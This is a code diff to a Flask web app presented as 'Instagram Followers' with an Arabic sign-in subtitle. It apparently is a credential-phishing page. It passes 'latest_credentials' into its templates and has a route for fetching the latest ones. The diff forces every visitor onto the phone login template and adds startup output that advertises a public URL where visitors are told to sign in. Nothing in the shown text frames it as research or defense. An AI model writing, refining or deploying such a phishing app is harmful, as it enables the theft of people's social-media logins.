@@ -1,8 +1,8 @@
 from flask import Flask, render_template, request, jsonify
-from datetime import datetime
 import os
+from datetime import datetime
 
-app = Flask(__name__, template_folder="templates")
+app = Flask(__name__)
 app.config.update(
     TITLE=os.getenv("APP_TITLE", "Instagram Followers"),
     SUBTITLE=os.getenv("APP_SUBTITLE", "تسجيل الدخول إلى الحساب"),
@@ -23,13 +23,11 @@ def is_mobile_user_agent(user_agent: str) -> bool:
     user_agent = (user_agent or "").lower()
     return any(term in user_agent for term in ["mobile", "iphone", "ipad", "android", "phone"])
 
-
 @app.route("/", methods=["GET"])
 def index():
-    user_agent = request.headers.get("User-Agent", "")
-    template_name = "phone.html" if is_mobile_user_agent(user_agent) else "computer.html"
+    # سنقوم بإجبار الموقع على فتح صفحة phone.html للجميع
     return render_template(
-        template_name,
+        "phone.html",
         latest=latest_credentials,
         app_title=app.config["TITLE"],
         app_subtitle=app.config["SUBTITLE"],
@@ -71,3 +69,18 @@ def get_latest():
 @app.route("/health", methods=["GET"])
 def health_check():
     return jsonify({"status": "ok", "service": "instagram-followers"})
+
+
+if __name__ == "__main__":
+    host = os.getenv("HOST", "0.0.0.0")
+    port = int(os.getenv("PORT", "8000"))
+    domain = os.getenv("APP_DOMAIN", "instagram-followers.example").strip()
+    public_url = domain if domain.startswith(("http://", "https://")) else f"https://{domain}"
+
+    print("=" * 60)
+    print("📱 Professional web app")
+    print("Open this page in your browser and sign in")
+    print(f"Public URL: {public_url}")
+    print(f"Local preview: http://127.0.0.1:{port}/")
+    print("=" * 60)
+    app.run(host=host, port=port, debug=False, use_reloader=False)
